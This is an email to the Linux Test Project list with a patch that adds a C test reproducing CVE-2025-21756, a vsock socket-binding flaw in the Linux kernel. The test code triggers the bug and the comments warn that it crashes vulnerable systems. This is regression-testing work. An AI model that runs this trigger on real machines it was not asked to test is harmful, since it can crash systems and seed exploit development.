Return-Path: <ltp-bounces+ltp=archiver.kernel.org@lists.linux.it>
X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
	aws-us-west-2-korg-lkml-1.web.codeaurora.org
Received: from picard.linux.it (picard.linux.it [213.254.12.146])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.lore.kernel.org (Postfix) with ESMTPS id CE3DDCAC5AC
	for <ltp@archiver.kernel.org>; Mon, 22 Sep 2025 10:19:19 +0000 (UTC)
Received: from picard.linux.it (localhost [IPv6:::1])
	by picard.linux.it (Postfix) with ESMTP id 4B6D63CDE41
	for <ltp@archiver.kernel.org>; Mon, 22 Sep 2025 12:19:17 +0200 (CEST)
Received: from in-2.smtp.seeweb.it (in-2.smtp.seeweb.it [217.194.8.2])
 (using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
 key-exchange X25519 server-signature ECDSA (secp384r1))
 (No client certificate requested)
 by picard.linux.it (Postfix) with ESMTPS id 6CA823CCF3A
 for <ltp@lists.linux.it>; Mon, 22 Sep 2025 12:19:02 +0200 (CEST)
Received: from smtp-out2.suse.de (smtp-out2.suse.de [195.135.223.131])
 (using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
 key-exchange X25519 server-signature RSA-PSS (2048 bits) server-digest SHA256)
 (No client certificate requested)
 by in-2.smtp.seeweb.it (Postfix) with ESMTPS id D10B160029A
 for <ltp@lists.linux.it>; Mon, 22 Sep 2025 12:19:01 +0200 (CEST)
Received: from imap1.dmz-prg2.suse.org (imap1.dmz-prg2.suse.org
 [IPv6:2a07:de40:b281:104:10:150:64:97])
 (using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
 key-exchange X25519 server-signature RSA-PSS (4096 bits) server-digest SHA256)
 (No client certificate requested)
 by smtp-out2.suse.de (Postfix) with ESMTPS id 1E6CD1FFE1;
 Mon, 22 Sep 2025 10:19:00 +0000 (UTC)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=suse.de; s=susede2_rsa;
 t=1758536341; h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:cc:
 mime-version:mime-version:content-type:content-type:
 content-transfer-encoding:content-transfer-encoding;
 bh=ClamKM54UzH3F8E9SQ9FoyUg30+wIckN/7wVOSoAGDY=;
 b=pQF5bbrQrFbpnq7gghxG/MyKAQWMNoQAKntF4ZYFVKLswS8j/3lJfS814bFlr+1Y7vg5Wj
 tQHgduP6MZlmO81mWx9a8mAf2BJDj/v7utmjM+LRBWfz/4bhw+KXHZu8ui8578jdYdwv9z
 9OmAhvpH4CaoYvtXgBlVX3teb14Xu3U=
DKIM-Signature: v=1; a=ed25519-sha256; c=relaxed/relaxed; d=suse.de;
 s=susede2_ed25519; t=1758536341;
 h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:cc:
 mime-version:mime-version:content-type:content-type:
 content-transfer-encoding:content-transfer-encoding;
 bh=ClamKM54UzH3F8E9SQ9FoyUg30+wIckN/7wVOSoAGDY=;
 b=H7bFYrOKxJEphC9DDraUFZbuT84jKOnA11J0ncybaUgkmXzAPj5I1z3jgBtukpE3nOTdev
 pLdx4e/qz3mCq0Dg==
Authentication-Results: smtp-out2.suse.de;
 dkim=pass header.d=suse.de header.s=susede2_rsa header.b=KaD3jeaC;
 dkim=pass header.d=suse.de header.s=susede2_ed25519 header.b="DxLdHL/r"
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=suse.de; s=susede2_rsa;
 t=1758536340; h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:cc:
 mime-version:mime-version:content-type:content-type:
 content-transfer-encoding:content-transfer-encoding;
 bh=ClamKM54UzH3F8E9SQ9FoyUg30+wIckN/7wVOSoAGDY=;
 b=KaD3jeaCAtDO4Uft5kvxHXp6/3Dunf6VW0vil+vX0j9U5xsDihhdyr8eA15s/fIn2HexoS
 tmKLWdWqwve6RsdxS+cjYx/uXzKcFncoq6apmQwW5v4FJ0Um0Jfp1T17rLrj5vaYLiMf2n
 eRvaCOfDunKGyj3VswsrTe2ICfMP5NE=
DKIM-Signature: v=1; a=ed25519-sha256; c=relaxed/relaxed; d=suse.de;
 s=susede2_ed25519; t=1758536340;
 h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:cc:
 mime-version:mime-version:content-type:content-type:
 content-transfer-encoding:content-transfer-encoding;
 bh=ClamKM54UzH3F8E9SQ9FoyUg30+wIckN/7wVOSoAGDY=;
 b=DxLdHL/rrWn1XSACzfkpjr2mH52P0AIp3H9yTeTjJAF6URoNsLzinpqNEVwjkNee7AOfgU
 G/XkNvX9Vu9/BvCw==
Received: from imap1.dmz-prg2.suse.org (localhost [127.0.0.1])
 (using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
 key-exchange X25519 server-signature RSA-PSS (4096 bits) server-digest SHA256)
 (No client certificate requested)
 by imap1.dmz-prg2.suse.org (Postfix) with ESMTPS id E3A8313A63;
 Mon, 22 Sep 2025 10:18:59 +0000 (UTC)
Received: from dovecot-director2.suse.de ([2a07:de40:b281:106:10:150:64:167])
 by imap1.dmz-prg2.suse.org with ESMTPSA id PcEJM5Mi0WgQOgAAD6G6ig
 (envelope-from <andrea.cervesato@suse.de>); Mon, 22 Sep 2025 10:18:59 +0000
From: Andrea Cervesato <andrea.cervesato@suse.de>
Date: Mon, 22 Sep 2025 12:18:54 +0200
MIME-Version: 1.0
Message-Id: <20250922-cve-2025-21756-v1-1-074da211288a@suse.com>
X-B4-Tracking: v=1; b=H4sIAI0i0WgC/x3MQQqAIBBA0avErBvQoZK6SrQwHWs2FgoRhHfPW
 r7F/w9kTsIZpuaBxJdkOWKFbhtwu40bo/hqIEW9GonQXYwfkLTpB2Rtg/PWrOQ7qNGZOMj9D+e
 llBebakViYAAAAA==
X-Change-ID: 20250922-cve-2025-21756-e1afcda7b2d4
To: ltp@lists.linux.it
X-Mailer: b4 0.14.2
X-Developer-Signature: v=1; a=ed25519-sha256; t=1758536339; l=3872;
 i=andrea.cervesato@suse.com; s=20250922; h=from:subject:message-id;
 bh=ZIKkQcuoEpspc5l5paIInX9PUtYTcgPkq6Wo3h7loCs=;
 b=eYGc3mAPu2X02wgPoG3kCyx3UbcYWeQjfZfCElhtwWmaxP5IdIgIIyELiAzQz6Snc6Kd7WkWl
 54wuodo6/OyDlowNOCboAu9NjoSD+3Gqa+hgp7PE0v5DDd70lTBW/wb
X-Developer-Key: i=andrea.cervesato@suse.com; a=ed25519;
 pk=+8M3XgViLdcdNBM+Jdd90m3pV4jCw2tNsGCy5Rd+qHk=
X-Rspamd-Queue-Id: 1E6CD1FFE1
X-Rspamd-Action: no action
X-Rspamd-Server: rspamd1.dmz-prg2.suse.org
X-Spamd-Result: default: False [-4.51 / 50.00]; BAYES_HAM(-3.00)[100.00%];
 NEURAL_HAM_LONG(-1.00)[-1.000];
 R_DKIM_ALLOW(-0.20)[suse.de:s=susede2_rsa,suse.de:s=susede2_ed25519];
 NEURAL_HAM_SHORT(-0.20)[-1.000]; MIME_GOOD(-0.10)[text/plain];
 MX_GOOD(-0.01)[]; RCVD_TLS_ALL(0.00)[];
 RCVD_VIA_SMTP_AUTH(0.00)[]; ARC_NA(0.00)[];
 FUZZY_RATELIMITED(0.00)[rspamd.com]; MIME_TRACE(0.00)[0:+];
 RCPT_COUNT_TWO(0.00)[2];
 DKIM_SIGNED(0.00)[suse.de:s=susede2_rsa,suse.de:s=susede2_ed25519];
 TO_MATCH_ENVRCPT_ALL(0.00)[]; FROM_HAS_DN(0.00)[];
 TO_DN_SOME(0.00)[]; FROM_EQ_ENVFROM(0.00)[];
 DBL_BLOCKED_OPENRESOLVER(0.00)[suse.com:email,suse.com:mid,suse.de:dkim];
 RCVD_COUNT_TWO(0.00)[2]; DKIM_TRACE(0.00)[suse.de:+]
X-Virus-Scanned: clamav-milter 1.0.7 at in-2.smtp.seeweb.it
X-Virus-Status: Clean
Subject: [LTP] [PATCH] cve: add test reproducer for cve-2025-21756
X-BeenThere: ltp@lists.linux.it
X-Mailman-Version: 2.1.29
Precedence: list
List-Id: Linux Test Project <ltp.lists.linux.it>
List-Unsubscribe: <https://lists.linux.it/options/ltp>,
 <mailto:ltp-request@lists.linux.it?subject=unsubscribe>
List-Archive: <http://lists.linux.it/pipermail/ltp/>
List-Post: <mailto:ltp@lists.linux.it>
List-Help: <mailto:ltp-request@lists.linux.it?subject=help>
List-Subscribe: <https://lists.linux.it/listinfo/ltp>,
 <mailto:ltp-request@lists.linux.it?subject=subscribe>
Content-Type: text/plain; charset="us-ascii"
Content-Transfer-Encoding: 7bit
Errors-To: ltp-bounces+ltp=archiver.kernel.org@lists.linux.it
Sender: "ltp" <ltp-bounces+ltp=archiver.kernel.org@lists.linux.it>

From: Andrea Cervesato <andrea.cervesato@suse.com>

This test is verifying kernel commit fcdd2242c023 "vsock: Keep the
binding until socket destruction" merged inside v6.14.

Beware, it will crash the system!

Signed-off-by: Andrea Cervesato <andrea.cervesato@suse.com>
---
 runtest/cve                    |  1 +
 testcases/cve/.gitignore       |  1 +
 testcases/cve/cve-2025-21756.c | 92 ++++++++++++++++++++++++++++++++++++++++++
 3 files changed, 94 insertions(+)

diff --git a/runtest/cve b/runtest/cve
index 6d575aa2165bcd46e5ca36a07db33f69a91bd94a..c3ecd74dd9f837924b810b7b431ebb911d809966 100644
--- a/runtest/cve
+++ b/runtest/cve
@@ -92,3 +92,4 @@ cve-2020-25704 perf_event_open03
 cve-2022-0185 fsconfig03
 cve-2022-4378 cve-2022-4378
 cve-2025-38236 cve-2025-38236
+cve-2025-21756 cve-2025-21756
diff --git a/testcases/cve/.gitignore b/testcases/cve/.gitignore
index 8eb17ce56b01070e47917f9bb44cf146c0c5b338..dc1dad5b0d0d02a3ab57e72516c33ee7949c8431 100644
--- a/testcases/cve/.gitignore
+++ b/testcases/cve/.gitignore
@@ -14,3 +14,4 @@ cve-2022-4378
 icmp_rate_limit01
 tcindex01
 cve-2025-38236
+cve-2025-21756
diff --git a/testcases/cve/cve-2025-21756.c b/testcases/cve/cve-2025-21756.c
new file mode 100644
index 0000000000000000000000000000000000000000..7920dc716bc86456be5380d129e3a1b7d788fb83
--- /dev/null
+++ b/testcases/cve/cve-2025-21756.c
@@ -0,0 +1,92 @@
+// SPDX-License-Identifier: GPL-2.0-or-later
+/*
+ * Copyright (c) 2025 Andrea Cervesato <andrea.cervesato@suse.com>
+ */
+
+/*\
+ * Test for CVE-2025-21756 fixed in kernel v6.14:
+ * fcdd2242c023 vsock: Keep the binding until socket destruction
+ *
+ * Reproducer based on:
+ * https://lore.kernel.org/all/20250128-vsock-transport-vs-autobind-v3-5-1cf57065b770@rbox.co/
+ *
+ * Beware, this test will crash the system.
+ */
+
+#include "tst_test.h"
+
+#if HAVE_LINUX_VM_SOCKETS_H
+
+#include "lapi/vm_sockets.h"
+
+#define MAX_PORT_RETRIES	24
+#define VMADDR_CID_NONEXISTING	42
+
+static int vsock_bind(unsigned int cid, unsigned int port, int type)
+{
+	int sock;
+
+	struct sockaddr_vm sa = {
+		.svm_family = AF_VSOCK,
+		.svm_cid = cid,
+		.svm_port = port,
+	};
+
+	sock = SAFE_SOCKET(AF_VSOCK, type, 0);
+	SAFE_BIND(sock, (struct sockaddr *)&sa, sizeof(sa));
+
+	return sock;
+}
+
+static void run(void)
+{
+	int sockets[MAX_PORT_RETRIES];
+	struct sockaddr_vm addr;
+	int socket, sock_count;
+	socklen_t alen;
+
+	socket = vsock_bind(VMADDR_CID_LOCAL, VMADDR_PORT_ANY, SOCK_SEQPACKET);
+
+	alen = sizeof(addr);
+	SAFE_GETSOCKNAME(socket, (struct sockaddr *)&addr, &alen);
+
+	for (sock_count = 0; sock_count < MAX_PORT_RETRIES; ++sock_count) {
+		sockets[sock_count] = vsock_bind(VMADDR_CID_ANY,
+				   ++addr.svm_port, SOCK_SEQPACKET);
+	}
+
+	SAFE_CLOSE(socket);
+
+	socket = SAFE_SOCKET(AF_VSOCK, SOCK_SEQPACKET, 0);
+	if (!connect(socket, (struct sockaddr *)&addr, alen))
+		tst_brk(TBROK, "Unexpected connect() #1 success");
+
+	addr.svm_cid = VMADDR_CID_NONEXISTING;
+	if (!connect(socket, (struct sockaddr *)&addr, alen))
+		tst_brk(TBROK, "Unexpected connect() #2 success");
+
+	addr.svm_cid = VMADDR_CID_LOCAL;
+	addr.svm_port = VMADDR_PORT_ANY;
+
+	/* Vulnerable system may crash now. */
+	SAFE_BIND(socket, (struct sockaddr *)&addr, alen);
+	SAFE_CLOSE(socket);
+
+	tst_res(TPASS, "System still running after socket unbinding");
+
+	while (sock_count--)
+		SAFE_CLOSE(sockets[sock_count]);
+}
+
+static struct tst_test test = {
+	.test_all = run,
+	.tags = (const struct tst_tag[]) {
+		{"linux-git", "fcdd2242c023"},
+		{"CVE", "2025-21756"},
+		{}
+	}
+};
+
+#else
+TST_TEST_TCONF("No linux/vm_sockets.h");
+#endif

---
base-commit: 2f208c00cfc4a1d7d5d957ac2b866e1248623aa6
change-id: 20250922-cve-2025-21756-e1afcda7b2d4

Best regards,
-- 
Andrea Cervesato <andrea.cervesato@suse.com>


-- 
Mailing list info: https://lists.linux.it/listinfo/ltp
